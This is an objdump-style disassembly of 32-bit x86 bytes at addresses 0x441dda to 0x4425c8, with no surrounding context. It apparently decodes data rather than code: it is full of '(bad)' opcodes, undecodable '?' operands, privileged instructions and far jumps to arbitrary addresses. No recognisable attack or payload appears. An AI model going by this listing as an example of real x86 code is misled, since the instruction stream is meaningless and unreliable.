  441dda:	sar    BYTE PTR [esi],0x91
  441ddd:	scas   al,BYTE PTR es:[edi]
  441dde:	mov    ah,0x80
  441de0:	retf   0x7a90
  441de3:	add    BYTE PTR [eax-0x4e],dl
  441de6:	xor    DWORD PTR [edx+ebp*1+0x7574c0b4],edi
  441ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441dee:	ds dec edx
  441df0:	rol    dh,1
  441df2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441df3:	mov    dh,0x3f
  441df5:	or     al,0xbc
  441df7:	add    al,0x4c
  441df9:	mov    eax,0x695f307d
  441dfe:	(bad)  
  441dff:	aam    0x4f
  441e01:	pop    ebx
  441e02:	test   BYTE PTR [ecx],0x15
  441e05:	xor    BYTE PTR [esi-0x74],0x1d
  441e09:	or     eax,0x20aa140d
  441e0e:	arpl   WORD PTR [esi],ax
  441e10:	mov    WORD PTR [edx-0x50aeb426],?
  441e16:	push   0x9488d373
  441e1b:	aam    0x7c
  441e1d:	adc    ch,BYTE PTR [ebx+0x5]
  441e20:	(bad)  
  441e22:	pusha  
  441e23:	mov    cl,0xa2
  441e25:	retf   
  441e26:	cmp    dh,BYTE PTR [esp+ebx*1]
  441e29:	xchg   BYTE PTR [edi+0x11],ah
  441e2c:	pop    ebx
  441e2d:	out    0xb8,eax
  441e2f:	cmp    BYTE PTR [edi+0x2632e67a],ah
  441e35:	cmc    
  441e36:	inc    ebx
  441e37:	les    esp,FWORD PTR [edx+esi*8-0x64]
  441e3b:	mov    ebp,0x6ba24697
  441e40:	cmp    ebx,DWORD PTR [edx+0x4384c6c]
  441e46:	sahf   
  441e47:	xchg   BYTE PTR [eax-0x4c],al
  441e4a:	pop    es
  441e4b:	movups XMMWORD PTR [esi+edi*2-0x20837139],xmm6
  441e53:	push   es
  441e54:	mov    dh,0x8e
  441e56:	imul   eax,DWORD PTR [edx],0xffffff90
  441e59:	(bad)  
  441e5a:	sti    
  441e5b:	adc    BYTE PTR [ebp-0x2b],dh
  441e5e:	mov    ds:0x44cf8685,eax
  441e63:	and    ebp,DWORD PTR [eax]
  441e65:	xor    al,BYTE PTR ds:0xa264fb62
  441e6b:	jecxz  0x441edf
  441e6d:	inc    al
  441e6f:	(bad)  
  441e70:	adc    al,0x6c
  441e72:	sbb    eax,0x2a825fe8
  441e77:	add    al,0x92
  441e79:	and    bl,BYTE PTR [ecx+eiz*8-0x7edb87d6]
  441e80:	jo     0x441edc
  441e82:	mov    edx,0x2fd50148
  441e87:	inc    edx
  441e88:	push   ebp
  441e89:	mov    ds:0x14d18618,al
  441e8e:	nop
  441e8f:	pop    es
  441e90:	test   BYTE PTR [edx+0x30cf6a36],ch
  441e96:	test   BYTE PTR [edx-0x5cfe3934],bh
  441e9c:	xor    BYTE PTR [edx+0x4218b84e],0x56
  441ea3:	test   eax,0x2e6a7050
  441ea8:	cmp    al,0xc4
  441eaa:	mov    ?,WORD PTR [ebx+ebx*8]
  441ead:	sbb    esp,DWORD PTR ds:0x82c80aa9
  441eb3:	or     BYTE PTR [edi],cl
  441eb5:	adc    ch,BYTE PTR [ebx-0x1c1fd3d2]
  441ebb:	add    eax,DWORD PTR [esi+eax*4]
  441ebe:	xchg   esi,eax
  441ebf:	add    al,0x68
  441ec1:	push   es
  441ec2:	outs   dx,BYTE PTR ds:[esi]
  441ec3:	cmp    cl,BYTE PTR [eax]
  441ec5:	adc    al,al
  441ec7:	add    BYTE PTR [esi+0x648e2265],bl
  441ecd:	jge    0x441f0f
  441ecf:	xchg   edx,eax
  441ed0:	mov    ah,0x3c
  441ed2:	and    al,0x45
  441ed4:	sbb    al,0x11
  441ed6:	add    eax,0x6f1ab9a8
  441edb:	loopne 0x441e5e
  441edd:	aad    0xa
  441edf:	add    al,0x2b
  441ee1:	retf   0xeea1
  441ee4:	in     al,0xd7
  441ee6:	loopne 0x441eec
  441ee8:	push   ds
  441ee9:	add    edx,ecx
  441eeb:	call   0x5b264c98
  441ef0:	(bad)  
  441ef2:	cld    
  441ef3:	mov    DWORD PTR [eax-0x10],0x559f5c3a
  441efa:	xchg   esp,eax
  441efb:	dec    ebx
  441efc:	cwde   
  441efd:	lahf   
  441efe:	pop    edi
  441eff:	sahf   
  441f00:	pushf  
  441f01:	rol    DWORD PTR [esi-0x69939f90],0xc9
  441f08:	sahf   
  441f09:	inc    edi
  441f0a:	ss adc ch,BYTE PTR ds:[eax]
  441f0e:	loopne 0x441f59
  441f10:	push   edx
  441f11:	into   
  441f12:	cwde   
  441f13:	imul   ebp,DWORD PTR [ebx+0x4],0x33c8eab4
  441f1a:	cli    
  441f1b:	cld    
  441f1c:	adc    eax,DWORD PTR [edx]
  441f1e:	aas    
  441f1f:	dec    eax
  441f20:	mov    al,ds:0xb0b46982
  441f25:	or     al,BYTE PTR [ebx]
  441f27:	ret    0x4f82
  441f2a:	fidivr DWORD PTR [esi+edx*4-0x78fc75de]
  441f31:	xor    al,0xf0
  441f33:	inc    esp
  441f34:	es jecxz 0x441f21
  441f37:	jae    0x441f33
  441f39:	and    al,0x84
  441f3b:	dec    edx
  441f3c:	enter  0x386d,0x4a
  441f40:	sub    DWORD PTR [ecx],eax
  441f42:	or     eax,0xc7b9828
  441f47:	jne    0x441efb
  441f49:	push   ds
  441f4a:	xchg   esi,eax
  441f4b:	loopne 0x441fc5
  441f4d:	sbb    ah,0x4
  441f50:	sbb    eax,esp
  441f52:	call   0x20ae79d5
  441f57:	inc    esi
  441f58:	int3   
  441f59:	nop
  441f5a:	ss push ds
  441f5c:	sbb    bh,BYTE PTR [ebx]
  441f5e:	lock int3 
  441f60:	mov    edi,0xdb36578
  441f65:	inc    edx
  441f66:	sbb    BYTE PTR [edi+0x5ca6ac52],al
  441f6c:	jge    0x441f7b
  441f6e:	les    edx,FWORD PTR ds:0xee945b81
  441f74:	(bad)  
  441f75:	(bad)  
  441f76:	jmp    0xc4a8f815
  441f7b:	mov    esi,0x643a7f78
  441f80:	pop    es
  441f81:	test   al,0xad
  441f83:	stos   DWORD PTR es:[edi],eax
  441f84:	cmp    ch,dl
  441f86:	push   0x9b37702e
  441f8b:	fcom   st(2)
  441f8d:	jbe    0x441ff0
  441f8f:	jmp    0x3fa6b6fd
  441f94:	push   0xffffffdf
  441f96:	cmp    DWORD PTR [esi],ebp
  441f98:	push   ebx
  441f99:	lock shr dl,cl
  441f9c:	or     al,0xc4
  441f9e:	jmp    0x9a69:0xb5affe70
  441fa5:	xchg   BYTE PTR [edx+eax*4],al
  441fa8:	or     BYTE PTR [ebp-0x18],cl
  441fab:	xchg   ebp,eax
  441fac:	jns    0x44201b
  441fae:	add    eax,0xcbba51ed
  441fb3:	cli    
  441fb4:	nop
  441fb5:	adc    bl,BYTE PTR [ebp+0x6a]
  441fb8:	mov    ecx,0x5003b69f
  441fbd:	lods   eax,DWORD PTR ds:[esi]
  441fbe:	cli    
  441fbf:	xor    dl,cl
  441fc1:	push   ds
  441fc2:	dec    eax
  441fc3:	cld    
  441fc4:	pop    esi
  441fc5:	and    ch,ah
  441fc7:	adc    DWORD PTR [eax+0x7d548017],eax
  441fcd:	loope  0x44201f
  441fcf:	mov    dh,0x79
  441fd1:	add    esp,ebp
  441fd3:	and    ebp,ebp
  441fd5:	push   ss
  441fd6:	lods   al,BYTE PTR ds:[esi]
  441fd7:	inc    ebp
  441fd8:	fld    DWORD PTR [eax]
  441fda:	mov    eax,ds:0x839a2b14
  441fdf:	xor    BYTE PTR [ebx-0x110dcd5c],0x4f
  441fe6:	aam    0xf
  441fe8:	push   0x3c
  441fea:	or     ecx,DWORD PTR [esi]
  441fec:	dec    eax
  441fed:	shl    BYTE PTR [edx+ebx*8+0x1de6b501],cl
  441ff4:	fadd   st,st(3)
  441ff6:	pop    ds
  441ff7:	add    BYTE PTR [ebx-0x7b],ch
  441ffa:	sub    dl,bl
  441ffc:	dec    ebp
  441ffd:	push   0xe4f88855
  442002:	add    ebx,DWORD PTR [esp+ebx*1+0x68]
  442006:	push   es
  442007:	in     al,dx
  442008:	test   DWORD PTR [eax+edx*4-0x1c9e368],eax
  44200f:	pop    es
  442010:	int3   
  442011:	mov    dl,0xc
  442013:	inc    esp
  442014:	int3   
  442015:	jo     0x441fc3
  442017:	xchg   esp,eax
  442018:	mov    ch,0x46
  44201a:	mov    eax,ds:0x3395de6e
  44201f:	inc    esp
  442020:	push   ebx
  442021:	jno    0x442023
  442023:	loopne 0x442061
  442025:	pop    esi
  442026:	or     ebp,ebp
  442028:	push   ds
  442029:	sbb    DWORD PTR [ebx],edi
  44202b:	add    al,0x48
  44202d:	jle    0x44207d
  44202f:	imul   BYTE PTR [esi]
  442031:	inc    edx
  442032:	test   al,0x5
  442034:	mov    DWORD PTR [edx+edi*4-0x7b153044],0xc1410a18
  44203f:	xchg   ebp,eax
  442040:	test   DWORD PTR [edi+0x14],ecx
  442043:	xchg   edx,ebp
  442045:	aaa    
  442046:	nop
  442047:	icebp  
  442048:	or     bh,BYTE PTR [ebx]
  44204a:	pop    edx
  44204b:	fsqrt  
  44204d:	sahf   
  44204e:	shr    BYTE PTR [edi+0x403e6473],0x5f
  442055:	ss mov al,0x41
  442058:	fs mov al,0x4
  44205b:	dec    edx
  44205c:	js     0x442010
  44205e:	add    ebx,ebp
  442060:	xchg   ebx,eax
  442061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442062:	fnstenv [eax+0x26]
  442065:	mov    ?,WORD PTR ds:0xc67ada1d
  44206b:	jo     0x442058
  44206d:	add    BYTE PTR ds:0x1de662c4,bh
  442073:	fwait
  442074:	pop    ss
  442075:	cwde   
  442076:	push   ebx
  442077:	repz add BYTE PTR [ebx+0x38e42516],ch
  44207e:	add    BYTE PTR [edx],bl
  442080:	mov    WORD PTR [edi+0xa],cs
  442083:	xor    BYTE PTR [edi+0x200e2d6e],al
  442089:	inc    DWORD PTR [ecx-0x15]
  44208c:	(bad)  
  44208d:	mov    eax,0x2a09c9df
  442092:	xchg   ebx,eax
  442093:	fadd   DWORD PTR [eax]
  442095:	cmc    
  442096:	pushf  
  442097:	xchg   ebx,eax
  442098:	lods   eax,DWORD PTR ds:[esi]
  442099:	dec    edi
  44209a:	add    ebx,esp
  44209c:	xchg   edi,eax
  44209d:	push   esp
  44209e:	in     eax,dx
  44209f:	sbb    BYTE PTR [eax],dl
  4420a1:	mov    al,ss:0x5bd87eb3
  4420a7:	xor    al,0xe1
  4420a9:	mov    ds:0x2d80843d,al
  4420ae:	jl     0x44209c
  4420b0:	or     edx,DWORD PTR [eax+ecx*8+0x6fa82101]
  4420b7:	mov    ah,0xa3
  4420b9:	push   edx
  4420ba:	dec    eax
  4420bb:	push   esi
  4420bc:	and    DWORD PTR [ebx-0x2],eax
  4420bf:	sbb    BYTE PTR [edx+esi*4+0x74],bh
  4420c3:	mov    dl,0x7e
  4420c5:	test   eax,0x6c983dd4
  4420ca:	sub    DWORD PTR [esi],edi
  4420cc:	push   edx
  4420cd:	cmp    BYTE PTR [edx],al
  4420cf:	mov    ebp,DWORD PTR [eax+0xd]
  4420d2:	fwait
  4420d3:	adc    al,0x32
  4420d5:	mov    al,0xa0
  4420d7:	test   al,0x78
  4420d9:	jmp    0xd339:0x39de28c8
  4420e0:	rol    BYTE PTR [ebx-0x50],1
  4420e3:	data16 adc al,0x61
  4420e6:	add    al,0xfe
  4420e8:	and    BYTE PTR [esi-0x2d],0x34
  4420ec:	dec    ebp
  4420ed:	sbb    BYTE PTR [esi+0x75308a0c],bl
  4420f3:	inc    ebp
  4420f4:	mov    ds:0x71fb9a69,al
  4420f9:	out    dx,eax
  4420fa:	ins    DWORD PTR es:[edi],dx
  4420fb:	pusha  
  4420fc:	repz es clc 
  4420ff:	cs pop ebp
  442101:	sbb    eax,ebx
  442103:	(bad)  
  442104:	cli    
  442105:	in     eax,0x0
  442107:	jmp    0x44215c
  442109:	loope  0x4420aa
  44210b:	push   0xffffffbf
  44210d:	sub    DWORD PTR [esi-0x1e],eax
  442110:	std    
  442111:	jp     0x442186
  442113:	cs xchg esi,eax
  442115:	inc    edi
  442116:	adc    BYTE PTR [eax-0x7f],bh
  442119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44211a:	into   
  44211b:	call   0xc0db:0x5ec1320c
  442122:	retf   
  442123:	test   DWORD PTR [eax+0x42ee0670],esi
  442129:	retf   0xa868
  44212c:	add    bh,ah
  44212e:	push   esi
  44212f:	test   al,0x97
  442131:	test   al,0x77
  442133:	add    dh,BYTE PTR [ecx+eax*4+0x281f5c00]
  44213a:	shl    DWORD PTR [eax+0x41],cl
  44213d:	jmp    0x69f2:0x5c4413f5
  442144:	and    edx,ebp
  442146:	jle    0x4421aa
  442148:	lea    edi,[ebx]
  44214a:	es out dx,al
  44214c:	push   ss
  44214d:	push   edx
  44214e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44214f:	mov    esp,ss
  442151:	dec    ebx
  442152:	or     ebx,ebx
  442154:	sbb    al,dl
  442156:	data16 (bad) 
  442159:	push   0x2f
  44215b:	xor    al,0x15
  44215d:	in     eax,dx
  44215e:	dec    edx
  44215f:	push   esi
  442160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442161:	cmp    dl,BYTE PTR [edi]
  442163:	inc    esi
  442164:	stc    
  442165:	mov    esi,0x35a36041
  44216a:	(bad)
  44216f:	push   eax
  442170:	leave  
  442171:	popa   
  442172:	stos   DWORD PTR es:[edi],eax
  442173:	push   0x342af289
  442178:	xor    al,0x98
  44217a:	sub    bl,BYTE PTR [edx-0x4e]
  44217d:	bound  edx,QWORD PTR [edx-0x2]
  442180:	cmc    
  442181:	stc    
  442182:	enter  0xc960,0xba
  442186:	out    0xc1,al
  442188:	add    BYTE PTR [edi-0x4bcd8495],dh
  44218e:	push   edi
  44218f:	fld    QWORD PTR [edx-0x78]
  442192:	fdiv   QWORD PTR [esi]
  442194:	call   0xa8df3e6a
  442199:	mov    WORD PTR [edx],es
  44219b:	out    0x16,al
  44219d:	mov    al,0x64
  44219f:	in     al,0xf4
  4421a1:	lods   al,BYTE PTR ds:[esi]
  4421a2:	dec    edi
  4421a3:	or     DWORD PTR [eax+0x50],ebx
  4421a6:	mov    al,ds:0x65bb72a5
  4421ab:	sbb    BYTE PTR [eax-0x5b732bec],bh
  4421b1:	and    al,0x9a
  4421b3:	sar    BYTE PTR [esi],0x93
  4421b6:	push   eax
  4421b7:	mov    bl,0x29
  4421b9:	mov    edx,0x55f7637a
  4421be:	loopne 0x442177
  4421c0:	sub    ebp,0x4b587af4
  4421c6:	fild   QWORD PTR [edx]
  4421c8:	or     ch,BYTE PTR ds:0x40f1b740
  4421ce:	push   esp
  4421cf:	push   es
  4421d0:	dec    edx
  4421d1:	push   esi
  4421d2:	xchg   DWORD PTR [esi+edi*1],eax
  4421d5:	retf   
  4421d6:	cwde   
  4421d7:	enter  0x238,0xdc
  4421db:	mov    al,0xad
  4421dd:	imul   esi,DWORD PTR [eax-0x3e79fbe7],0x31877c75
  4421e7:	push   ss
  4421e8:	or     al,0x35
  4421ea:	pop    edx
  4421eb:	push   0xffffffb6
  4421ed:	jmp    0x1846c57a
  4421f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4421f3:	shl    BYTE PTR [edx+0x66],0x96
  4421f7:	fiadd  WORD PTR [eax-0x53]
  4421fa:	test   BYTE PTR ds:0x346f60fe,cl
  442200:	push   esi
  442201:	push   ebx
  442202:	sbb    ecx,DWORD PTR fs:[edx-0xe]
  442206:	mov    bh,0xb8
  442208:	mov    dh,0x27
  44220a:	xchg   edi,eax
  44220b:	sbb    eax,0x8a599a8a
  442210:	inc    eax
  442211:	ds out 0xf,al
  442214:	repnz nop
  442216:	mov    al,0x36
  442218:	ss push edx
  44221a:	(bad)  
  44221b:	loope  0x442253
  44221d:	retf   
  44221e:	xor    al,0xec
  442220:	sub    dl,BYTE PTR [eax]
  442222:	cmp    BYTE PTR [edx-0x42],bh
  442225:	icebp  
  442226:	into   
  442227:	cld    
  442228:	pop    edx
  442229:	loop   0x44223c
  44222b:	mov    cl,0x56
  44222d:	adc    BYTE PTR [ebp+0x1a],dl
  442230:	test   DWORD PTR [ecx-0x58],edx
  442233:	sub    eax,0x608d1112
  442238:	add    BYTE PTR [edx],0xe6
  44223b:	dec    ecx
  44223c:	out    0x3b,eax
  44223e:	sahf   
  44223f:	add    BYTE PTR [ebp-0x1c],dl
  442242:	inc    ebx
  442243:	or     al,0x20
  442245:	or     al,0x5e
  442247:	in     eax,0xa8
  442249:	(bad)  
  44224a:	push   esp
  44224b:	imul   esp,edx,0xffffff9d
  44224e:	and    dl,BYTE PTR [ebx]
  442250:	in     al,dx
  442251:	fbstp  TBYTE PTR [edi-0x26]
  442254:	dec    ebx
  442255:	dec    ebx
  442256:	mov    edi,0x9cb1baee
  44225b:	mov    ss,WORD PTR [eax]
  44225d:	cmp    dl,0x25
  442260:	push   ss
  442261:	sub    ch,BYTE PTR gs:[edx-0x5f]
  442265:	je     0x4421ed
  442267:	pop    es
  442268:	or     eax,ebx
  44226a:	push   0x75dcc904
  44226f:	outs   dx,BYTE PTR ds:[esi]
  442270:	call   0x702b:0xc19a69a6
  442277:	jge    0x442212
  442279:	pop    eax
  44227a:	ds enter 0xd55a,0x4
  44227f:	faddp  st(0),st
  442281:	ins    BYTE PTR es:[edi],dx
  442282:	mov    dl,0x1e
  442284:	pusha  
  442285:	add    ebp,ecx
  442287:	fisub  DWORD PTR [ecx-0x56]
  44228a:	adc    dh,BYTE PTR [edx]
  44228c:	add    dl,ah
  44228e:	das    
  44228f:	(bad)  
  442290:	lods   eax,DWORD PTR ds:[esi]
  442291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442292:	imul   ebx,DWORD PTR [edx-0x28a62c5a],0x69a6cb55
  44229c:	call   0x42fc:0x7e00b1e6
  4422a3:	enter  0x4d46,0xd3
  4422a7:	ins    BYTE PTR es:[edi],dx
  4422a8:	call   0xf10b:0x8dc05ac4
  4422af:	ja     0x442308
  4422b1:	push   edx
  4422b2:	shl    DWORD PTR [esi*8-0x63f3168d],cl
  4422b9:	dec    ebp
  4422ba:	shl    DWORD PTR [ebx*2+0x26a01afe],cl
  4422c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4422c2:	and    ch,BYTE PTR [ebp-0x26]
  4422c5:	add    DWORD PTR [eax+0x3a3e7af6],0xd979c86
  4422cf:	es ds inc esp
  4422d2:	inc    esp
  4422d3:	(bad)  
  4422d4:	xchg   esi,eax
  4422d5:	push   cs
  4422d6:	loopne 0x442330
  4422d8:	adc    dh,BYTE PTR [esi-0x47]
  4422db:	dec    eax
  4422dc:	pusha  
  4422dd:	push   ss
  4422de:	mov    esp,0xada5a1e2
  4422e3:	scas   al,BYTE PTR es:[edi]
  4422e4:	hlt    
  4422e5:	dec    esp
  4422e6:	jmp    0x4203a930
  4422eb:	pop    edx
  4422ec:	and    edx,edi
  4422ee:	add    al,0xec
  4422f0:	push   edi
  4422f1:	and    edi,DWORD PTR [esp+edi*2+0x9a36a53]
  4422f8:	push   ds
  4422f9:	sbb    bh,BYTE PTR [edx+0x2200b962]
  4422ff:	ret    
  442300:	sbb    eax,0x942ccb26
  442305:	sub    al,0xc0
  442307:	add    al,0x43
  442309:	ret    
  44230a:	xchg   edi,eax
  44230b:	mov    eax,ds:0x980d8efc
  442310:	mov    WORD PTR [edx+ebx*1+0x116145f8],fs
  442317:	aam    0x44
  442319:	inc    edi
  44231a:	shl    BYTE PTR [edx+0x36ed6acb],1
  442320:	sbb    DWORD PTR [esi+0xc6fe25e],esp
  442326:	bound  eax,QWORD PTR ds:0x6a836894
  44232c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44232d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44232e:	adc    al,0x3e
  442330:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442331:	dec    edx
  442332:	cmp    ah,BYTE PTR [edx+eax*4+0x6caf395e]
  442339:	sub    esi,eax
  44233b:	test   BYTE PTR [ecx-0x58],0x3d
  44233f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442340:	jp     0x442339
  442342:	or     eax,0xd0f4a446
  442347:	inc    esp
  442348:	sti    
  442349:	mov    gs,WORD PTR ds:0x928d2890
  44234f:	jbe    0x4422d9
  442351:	jae    0x4423ac
  442353:	cmp    dl,BYTE PTR [esi-0x778dddb8]
  442359:	lock mov ch,BYTE PTR [edx]
  44235c:	xor    bl,al
  44235e:	or     BYTE PTR [eax+0xe32cd62],bh
  442364:	add    esp,edi
  442366:	add    bh,BYTE PTR [edx-0x38]
  442369:	ins    BYTE PTR es:[edi],dx
  44236a:	mov    esi,0xa52976fe
  44236f:	add    BYTE PTR [eax-0x3e],ah
  442372:	sahf   
  442373:	cmp    eax,0xbc01a5b0
  442378:	mov    dl,0xdc
  44237a:	xor    BYTE PTR [edi+0x447ad86c],dl
  442380:	jmp    0x659088db
  442385:	dec    eax
  442386:	ins    DWORD PTR es:[edi],dx
  442387:	retfw  0x801e
  44238b:	add    BYTE PTR [edx-0x78],0x52
  44238f:	pop    eax
  442390:	in     al,0xb
  442392:	sbb    eax,0x96609f01
  442397:	push   eax
  442398:	push   esp
  442399:	mov    al,ds:0x45681455
  44239e:	test   eax,0x56a59058
  4423a3:	bound  esi,QWORD PTR [edi]
  4423a5:	or     al,0x9d
  4423a7:	outs   dx,BYTE PTR es:[esi]
  4423a9:	mov    bl,BYTE PTR [esp+esi*8+0x10]
  4423ad:	call   0x4366:0x6c6e0680
  4423b4:	jl     0x4423dc
  4423b6:	cmc    
  4423b7:	or     DWORD PTR [esi+0x49],0x667b423d
  4423be:	pop    es
  4423bf:	inc    edx
  4423c0:	scas   eax,DWORD PTR es:[edi]
  4423c1:	or     eax,0x3ed73746
  4423c6:	mov    al,0x43
  4423c8:	lods   eax,DWORD PTR ds:[esi]
  4423c9:	mov    ds,WORD PTR [edx]
  4423cb:	xchg   esi,eax
  4423cc:	loope  0x44244a
  4423ce:	test   BYTE PTR [edi+0x5b],al
  4423d1:	push   edx
  4423d2:	fnstcw WORD PTR [edx-0x6d47fd6a]
  4423d8:	push   eax
  4423d9:	mov    edi,0xb5346d05
  4423de:	sub    dh,ch
  4423e0:	push   cs
  4423e1:	call   0x39d8:0x3b68854
  4423e8:	(bad)  
  4423e9:	out    dx,al
  4423ea:	repnz clc 
  4423ec:	mov    al,ds:0xa108722
  4423f1:	sub    ah,bh
  4423f3:	repz dec eax
  4423f5:	lahf   
  4423f6:	inc    ebp
  4423f7:	and    BYTE PTR [esi],cl
  4423f9:	test   al,0x5b
  4423fb:	je     0x442427
  4423fd:	mov    dl,ah
  4423ff:	cmp    edx,edx
  442401:	and    ecx,DWORD PTR [ebx+0x2a]
  442404:	xchg   DWORD PTR [ebx],esi
  442406:	bound  edx,QWORD PTR [ecx+0xbb52cc4]
  44240c:	pusha  
  44240d:	leave  
  44240e:	imul   esi,DWORD PTR [esi+ebp*2-0x52ad5690],0x18c643a3
  442419:	push   0x37d6e954
  44241e:	stos   BYTE PTR es:[edi],al
  44241f:	ds and al,0x54
  442422:	push   0xffffffc6
  442424:	xor    al,0xe6
  442426:	or     al,0xb7
  442428:	inc    edi
  442429:	sbb    ebx,DWORD PTR [ebx-0x23d9cb66]
  44242f:	jp     0x4424ae
  442431:	or     al,0x5
  442433:	xchg   DWORD PTR [eax],esp
  442435:	fisub  DWORD PTR [edx]
  442437:	mov    dh,0xb8
  442439:	scas   al,BYTE PTR es:[edi]
  44243a:	aam    0xbd
  44243c:	or     al,0xa7
  44243e:	sbb    dl,BYTE PTR ds:0xe6781f45
  442444:	cmp    BYTE PTR [edi],ah
  442446:	mov    dl,0xbb
  442448:	mov    ebp,0x187c5626
  44244d:	bswap  edx
  44244f:	outs   dx,DWORD PTR ds:[esi]
  442450:	push   ss
  442451:	add    al,0x2b
  442453:	xchg   BYTE PTR [ecx],al
  442455:	or     ebp,DWORD PTR [esi-0x154c43f4]
  44245b:	(bad)  
  44245c:	and    al,0xd
  44245e:	pop    ss
  44245f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442460:	push   ds
  442461:	sbb    al,0x4d
  442463:	mov    dh,0x46
  442465:	scas   al,BYTE PTR es:[edi]
  442466:	adc    al,0xc3
  442468:	inc    ebp
  442469:	lds    edx,FWORD PTR [edi]
  44246b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44246c:	pop    ebx
  44246d:	dec    esi
  44246e:	add    cl,BYTE PTR [edx]
  442470:	jne    0x44249a
  442472:	pop    ebx
  442473:	rol    DWORD PTR [ebp+0x6d],cl
  442476:	lods   al,BYTE PTR ds:[esi]
  442477:	mov    ch,0xd6
  442479:	and    eax,0x1b0058f2
  44247e:	adc    BYTE PTR [edx+0x30a81876],bh
  442484:	ror    BYTE PTR [edi+0x43],cl
  442487:	xchg   esi,eax
  442488:	push   esp
  442489:	fistp  DWORD PTR [ebp+eiz*1+0x2c]
  44248d:	push   0xf60af682
  442492:	sar    BYTE PTR [edx-0x36],0x2c
  442496:	xchg   ebp,eax
  442497:	fmul   DWORD PTR cs:[esp+edi*1-0x2]
  44249c:	int    0x0
  44249e:	mov    eax,ds:0x189324a0
  4424a3:	imul   DWORD PTR [edx+eax*4+0x708ab26b]
  4424aa:	(bad)  
  4424ab:	(bad)  
  4424ac:	jp     0x442436
  4424ae:	cld    
  4424af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4424b0:	rcl    BYTE PTR [ecx-0x69],cl
  4424b3:	mov    ah,0xe8
  4424b5:	sub    al,0x20
  4424b7:	inc    esp
  4424b8:	or     bh,BYTE PTR [eax]
  4424ba:	adc    al,0xf1
  4424bc:	add    DWORD PTR [edx],ebp
  4424be:	jp     0x442532
  4424c0:	push   ss
  4424c1:	add    edx,DWORD PTR [esi-0x5]
  4424c4:	popa   
  4424c5:	sub    al,0xea
  4424c7:	push   edi
  4424c8:	nop
  4424c9:	push   0xfc76c42c
  4424ce:	add    eax,0xc80f66c
  4424d3:	mov    eax,DWORD PTR [ebx+0x64ede2c4]
  4424d9:	int3   
  4424da:	mov    ah,0x4
  4424dc:	lahf   
  4424dd:	inc    esi
  4424de:	jb     0x44248f
  4424e0:	adc    ch,BYTE PTR [esi+0x36]
  4424e3:	mov    al,ds:0xfdb4aaa6
  4424e8:	js     0x44248a
  4424ea:	jge    0x4424ac
  4424ec:	push   0xffffffec
  4424ee:	jle    0x4424b8
  4424f0:	daa    
  4424f1:	inc    esi
  4424f2:	cmp    al,0x80
  4424f4:	add    eax,0x62aa620d
  4424f9:	bound  ecx,QWORD PTR [esi-0x1b]
  4424fc:	inc    cl
  4424fe:	xchg   BYTE PTR [edx],ah
  442500:	call   0x984c3dbf
  442505:	clc    
  442506:	xor    ch,BYTE PTR [ebp-0x18]
  442509:	mov    bh,0x84
  44250b:	mov    dh,0x60
  44250d:	add    al,0xbe
  44250f:	mov    ebx,0x6b03f728
  442514:	add    eax,edi
  442516:	add    BYTE PTR [edx+0x72],ch
  442519:	xchg   ebx,eax
  44251a:	and    dh,ch
  44251c:	dec    eax
  44251d:	add    al,0xb6
  44251f:	jmp    0x7b6b:0x72ab06b2
  442526:	bound  eax,QWORD PTR [edi-0x45]
  442529:	xchg   esp,eax
  44252a:	push   es
  44252b:	cld    
  44252c:	fdivr  QWORD PTR [edx+0x30]
  44252f:	gs pop eax
  442531:	push   ds
  442532:	ret    
  442533:	js     0x442596
  442535:	adc    al,0x1e
  442537:	push   0xb51aa9f6
  44253c:	in     eax,dx
  44253d:	fst    DWORD PTR [eax]
  44253f:	sahf   
  442540:	div    BYTE PTR [esi+0x3d]
  442543:	hlt    
  442544:	cmp    dl,ah
  442546:	push   ds
  442547:	xchg   ebx,eax
  442548:	jp     0x4425b2
  44254a:	push   eax
  44254b:	xchg   DWORD PTR [edi+0x52],ebx
  44254e:	ror    BYTE PTR [ebx-0x7db05f6b],cl
  442554:	push   0x1b6aef2e
  442559:	call   0xdd3afff4
  44255e:	into   
  44255f:	cld    
  442560:	loopne 0x442507
  442562:	xchg   edi,eax
  442563:	(bad)  
  442564:	arpl   WORD PTR [edx+0x36fc93db],ax
  44256a:	(bad)  
  44256b:	or     DWORD PTR [ebx-0x30],0x78dbe887
  442572:	test   BYTE PTR [ebp-0x2aa3aa5d],ch
  442578:	inc    esi
  442579:	jbe    0x4425a8
  44257b:	sbb    al,0x57
  44257d:	jmp    0x31e1:0xb1d0add
  442584:	mov    WORD PTR [esi+0x2c25d08a],es
  44258a:	mov    ds:0x3ed03852,eax
  44258f:	pop    eax
  442590:	js     0x4425f3
  442592:	mov    edx,0x4fd0c012
  442597:	stos   BYTE PTR es:[edi],al
  442598:	fcom   DWORD PTR [ebx+0x4065abf6]
  44259e:	jl     0x4425d6
  4425a0:	cmc    
  4425a1:	bound  ebp,QWORD PTR [edi+0x5aa5c66]
  4425a7:	push   ebp
  4425a8:	loopne 0x44255c
  4425aa:	mov    ?,WORD PTR [esi]
  4425ac:	mov    WORD PTR [eax+eiz*2],fs
  4425af:	mul    DWORD PTR [edx]
  4425b1:	push   ebp
  4425b2:	dec    ecx
  4425b3:	pusha  
  4425b4:	xor    dl,ch
  4425b6:	ror    DWORD PTR [ebx+0x27d2d8e],1
  4425bc:	push   edx
  4425bd:	and    al,0xd0
  4425bf:	sti    
  4425c0:	xchg   edx,eax
  4425c1:	aam    0xd4
  4425c3:	xor    al,0xc5
  4425c5:	sub    ecx,DWORD PTR [eax+0x1c]
  4425c8:	mov    ?,WORD PTR [esi+ebx*2-0x364f7ed2]
